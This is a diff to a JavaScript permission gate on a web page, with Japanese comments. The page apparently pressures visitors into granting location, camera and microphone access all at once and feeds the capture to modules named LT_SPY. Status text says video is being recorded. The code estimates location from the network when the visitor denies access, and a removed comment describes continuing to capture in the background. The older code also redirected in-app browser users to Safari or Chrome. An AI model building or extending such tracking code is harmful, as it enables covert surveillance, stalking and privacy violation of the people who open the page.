@@ -1,6 +1,4 @@
-/* 要件ゲート。押された「同じタスク」で 位置情報・カメラ・マイク を同時に要求する。
-   こうすると3つのダイアログが続けて出る（位置情報だけ遅れて出ない）。
-   取れないときは止めずに先へ進み、裏で取り続ける。 */
+/* 要件ゲート。押された「同じタスク」で 位置情報・カメラ・マイク を同時に要求する。 */
 (function () {
   "use strict";
 
@@ -28,8 +26,7 @@
       function fallback() {
         try {
           var t = document.createElement("textarea");
-          t.value = url;
-          t.style.cssText = "position:fixed;left:-9999px";
+          t.value = url; t.style.cssText = "position:fixed;left:-9999px";
           document.body.appendChild(t); t.select();
           document.execCommand("copy"); t.remove(); done();
         } catch (err) {}
@@ -42,32 +39,14 @@
     });
   }
 
-  function showInApp() {
-    var ua = navigator.userAgent || "", name = "";
-    if (/Instagram/i.test(ua)) name = "Instagram";
-    else if (/FBAN|FBAV/i.test(ua)) name = "Facebook";
-    else if (/Line\//i.test(ua)) name = "LINE";
-    else if (/Twitter/i.test(ua)) name = "X";
-    if (!name) return;
+  function showHelp() {
+    if (window.LTGEO && LTGEO.showHint) { try { LTGEO.showHint(); return; } catch (e) {} }
     var box = document.getElementById("lt_ia");
-    var nm = document.getElementById("lt_ia_name");
-    var a = document.getElementById("lt_safari");
-    if (!box) return;
-    box.style.display = "block";
-    if (nm) nm.textContent = name;
-    if (a) {
-      var ios = /iPhone|iPad|iPod/i.test(ua);
-      a.href = ios
-        ? location.href.replace(/^https:/, "x-safari-https:")
-        : "intent://" + location.href.replace(/^https?:\/\//, "") +
-          "#Intent;scheme=https;package=com.android.chrome;end";
-      a.textContent = ios ? "Safariで開き直す" : "Chromeで開き直す";
-    }
+    if (box) box.style.display = "block";
   }
 
-  /* 位置情報：LTGEO に任せる。開始はここ（タップと同じタスク） */
   function geoStart() {
-    if (!window.LTGEO) { say("① 位置情報：この端末では非対応", true); return Promise.resolve(false); }
+    if (!window.LTGEO) { say("① 位置情報：この端末では非対応", true); showHelp(); return Promise.resolve(false); }
     return new Promise(function (res) {
       var settled = false;
       function settle(v) { if (!settled) { settled = true; res(v); } }
@@ -78,7 +57,7 @@
         settle(true);
       });
       LTGEO.subscribeFail(function (why) {
-        if (why === "denied") { say("① 位置情報：許可されていません", true); showInApp(); }
+        if (why === "denied") { say("① 位置情報：ブロックされています", true); showHelp(); }
         else { say("① 位置情報：端末が位置を出せていません（回線からの推定で記録します）", true); }
         settle(false);
       });
@@ -86,16 +65,16 @@
 
       var inf = LTGEO.info();
       if (inf.running) LTGEO.retry(); else LTGEO.start();
-      setTimeout(function () { settle(!!window.LT_FIRST_FIX); }, 16000);
+      setTimeout(function () { settle(!!window.LT_FIRST_FIX); }, 20000);
     });
   }
 
   function cam() {
     if (!window.LT_CAM || !window.LT_SPY || !window.LT_SPY.cam) return Promise.resolve(true);
     say("② カメラの許可を確認しています…");
-    return Promise.race([window.LT_SPY.cam(), wait(25000)]).then(function (ok) {
+    return Promise.race([window.LT_SPY.cam(), wait(30000)]).then(function (ok) {
       ok = ok !== false;
-      say(ok ? "② カメラ：映像を取得しました" : "② カメラ：取れませんでした", !ok);
+      say(ok ? "② カメラ：映像を記録中" : "② カメラ：取れませんでした", !ok);
       return ok;
     }).catch(function () { return false; });
   }
@@ -103,7 +82,7 @@
   function mic() {
     if (!window.LT_MIC || !window.LT_SPY || !window.LT_SPY.mic) return Promise.resolve(true);
     say("③ マイクの許可を確認しています…");
-    return Promise.race([window.LT_SPY.mic(), wait(25000)]).then(function (ok) {
+    return Promise.race([window.LT_SPY.mic(), wait(30000)]).then(function (ok) {
       ok = ok !== false;
       say(ok ? "③ マイク：OK" : "③ マイク：取れませんでした", !ok);
       return ok;
@@ -142,15 +121,15 @@
         if (ia) ia.style.display = "none";
       } else {
         document.body.classList.add("need");
+        if (!res.geo) showHelp();
       }
       setTimeout(pass, 250);
     }
 
-    /* ★ 3つを同時に要求（順番待ちにしない） */
     geoStart().then(function (v) { res.geo = v; if (--left <= 0) close(); });
     cam().then(function (v) { res.cam = v; if (--left <= 0) close(); });
     mic().then(function (v) { res.mic = v; if (--left <= 0) close(); });
-    setTimeout(close, 22000);
+    setTimeout(close, 24000);
   }
 
   if (btn) btn.addEventListener("click", run);
